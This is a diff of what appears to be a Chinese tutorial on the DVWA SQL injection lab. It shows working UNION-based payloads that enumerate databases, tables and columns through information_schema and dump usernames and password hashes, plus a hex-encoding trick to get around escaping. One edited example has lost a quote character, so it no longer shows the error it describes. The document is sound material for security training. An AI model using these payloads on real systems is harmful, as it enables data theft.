@@ -580,7 +580,11 @@
 <p>当输入的用户ID过大时，数据库中没有这个ID，界面不会有任何返回信息。</p>
 <p>输入ID为1时，界面返回ID为1的用户信息：</p>
 <p><img alt="20190502142836.png" src="https://raw.githubusercontent.com/handbye/images/master/20190502142836.png" /></p>
-<p>此时执行的sql语句为：<code>SELECT first_name, last_name FROM users WHERE user_id = '1'</code></p>
+<p>此时执行的sql语句为：</p>
+<pre><code class="sql">
+SELECT first_name, last_name FROM users WHERE  user_id  =  '1'
+</code></pre>
+
 <p><strong>输入恶意的ID就可以构造不同的sql语句进行执行，从而查询出我们想得到的一切信息。</strong></p>
 <p>注入过程：</p>
 <ol>
@@ -592,18 +596,31 @@
 </li>
 </ol>
 <p><img alt="20190502143452.png" src="https://raw.githubusercontent.com/handbye/images/master/20190502143452.png" /></p>
-<p>因为此时执行的sql语句相当于：<code>SELECT first_name, last_name FROM users WHERE user_id = '1''</code> 这个语句显然错误。</p>
+<p>因为此时执行的sql语句相当于：</p>
+<pre><code class="sql">
+SELECT first_name, last_name FROM users WHERE  user_id  =  '1'
+</code></pre>
+
+<p>这个语句显然错误。</p>
 <ul>
 <li>输入ID为<code>1' and '1' = '1</code>时出现以下提示：</li>
 </ul>
 <p><img alt="20190502143927.png" src="https://raw.githubusercontent.com/handbye/images/master/20190502143927.png" /></p>
-<p>因为此时执行的sql语句相当于：<code>SELECT first_name, last_name FROM users WHERE user_id = '1' and '1' = '1'</code></p>
+<p>因为此时执行的sql语句相当于：</p>
+<pre><code class="sql">
+SELECT first_name, last_name FROM users WHERE  user_id  =  '1'  and  '1'  =  '1'
+</code></pre>
+
 <p><code>and '1'='1'</code>显然成立，所以就会返回user_id为1的用户信息。</p>
 <ul>
 <li>输入ID为<code>1' or '1' = '1</code>时出现以下提示：</li>
 </ul>
 <p><img alt="20190502144303.png" src="https://raw.githubusercontent.com/handbye/images/master/20190502144303.png" /></p>
-<p>界面将所有的用户信息都显示了出来，因为此时执行的sql语句相当于：<code>SELECT first_name, last_name FROM users WHERE user_id = '1' or '1' = '1'</code></p>
+<p>界面将所有的用户信息都显示了出来，因为此时执行的sql语句相当于：</p>
+<pre><code class="sql">
+SELECT first_name, last_name FROM users WHERE  user_id  =  '1'  or  '1'  =  '1'
+</code></pre>
+
 <p><code>or '1'='1'</code>显然成立，所以就会返回所有的用户信息。</p>
 <p>以上实验过程说明存在字符型注入。</p>
 <ol>
@@ -631,31 +648,54 @@
 <p>union 运算符可以将两个或两个以上 select 语句的查询结果集合合并成一个结果集合显示，即执行联合查询。需要注意在使用 union 查询的时候需要和主查询的列数相同，而我们之前已经知道了主查询列数为 2，接下来就好办了。</p>
 </blockquote>
 <ul>
-<li>输入<code>1' union select database(),user()#</code>进行查询，可获取数据库名和数据库用户名：</li>
+<li>输入以下语句进行查询：</li>
 </ul>
+<pre><code class="sql">
+1' union select database(),user()#
+</code></pre>
+
+<p>可获取数据库名和数据库用户名：</p>
 <p><img alt="20190502151701.png" src="https://raw.githubusercontent.com/handbye/images/master/20190502151701.png" /></p>
 <ul>
-<li>输入 <code>1' union select version(),@@version_compile_os#</code>进行查询，可获取数据库版本和当前操作系统：</li>
+<li>输入以下语句进行查询</li>
 </ul>
+<pre><code class="sql">
+1' union select version(),@@version_compile_os#
+</code></pre>
+
+<p>可获取数据库版本和当前操作系统：</p>
 <p><img alt="20190502152012.png" src="https://raw.githubusercontent.com/handbye/images/master/20190502152012.png" /></p>
 <blockquote>
 <p>information_schema 是 mysql 自带的一张表，这张数据表保存了 Mysql 服务器所有数据库的信息,如数据库名，数据库的表，表栏的数据类型与访问权限等。该数据库拥有一个名为 tables 的数据表，该表包含两个字段 table_name 和 table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库。</p>
 </blockquote>
 <ul>
-<li>输入<code>1' union select table_name,table_schema from information_schema.tables where table_schema= 'dvwa'#</code>进行查询,可获取数据表名：</li>
+<li>输入以下语句进行查询：</li>
 </ul>
+<pre><code class="sql">
+1' union select table_name,table_schema from information_schema.tables where table_schema= 'dvwa'#
+</code></pre>
+
+<p>可获取数据表名：</p>
 <p><img alt="20190502152239.png" src="https://raw.githubusercontent.com/handbye/images/master/20190502152239.png" /></p>
 <p>可看到当前数据库中有两个表：<code>guestbook</code>和<code>users</code></p>
 <ol>
 <li>获取表中的字段名</li>
 </ol>
-<p>输入<code>1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #</code>进行查询：</p>
+<p>输入以下语句进行查询：</p>
+<pre><code class="sql">
+1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #
+</code></pre>
+
 <p><img alt="20190502152953.png" src="https://raw.githubusercontent.com/handbye/images/master/20190502152953.png" /></p>
 <p>说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</p>
 <ol>
 <li>获取users表中的所有数据</li>
 </ol>
-<p>输入：<code>1' union select user,password from users#</code>进行查询：</p>
+<p>输入以下语句进行查询：</p>
+<pre><code class="sql">
+1' union select user,password from users#
+</code></pre>
+
 <p><img alt="20190502153241.png" src="https://raw.githubusercontent.com/handbye/images/master/20190502153241.png" /></p>
 <p>得到了所有用户的用户名和密码，密码使用MD5加密后的字符串，使用在线MD5解密网站解密即可。</p>
 <h2 id="medium">Medium等级</h2>
@@ -670,7 +710,12 @@
 <p><strong>查看Medium等级的源码：</strong></p>
 <p><img alt="20190502165251.png" src="https://raw.githubusercontent.com/handbye/images/master/20190502165251.png" /></p>
 <p>可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号<code>\x00,\n,\r,\,’,”,\x1a</code>进行转义来防止注入，但是此注入类型位数字型的，这个过滤方法也没啥用。</p>
-<p>如果在联合查询时需要用到单引号的地方，如在<code>1 union select table_name,table_schema from information_schema.tables where table_schema= 'dvwa'#</code>此处dvwa需要用单引号括起来，此时我们可将dvwa转换成16进制的编码进行注入。</p>
+<p>如果在联合查询时需要用到单引号的地方，如:</p>
+<pre><code class="sql">
+1  union  select table_name,table_schema from information_schema.tables where table_schema=  'dvwa'#
+</code></pre>
+
+<p>此处dvwa需要用单引号括起来，此时我们可将dvwa转换成16进制的编码进行注入。</p>
 <h2 id="high">High等级</h2>
 <p>High等级将用户输入和界面显示分开在了两个页面上，这种方式的注入和Low等级的注入完全相同。</p>
 <p><img alt="20190502205756.png" src="https://raw.githubusercontent.com/handbye/images/master/20190502205756.png" /></p>
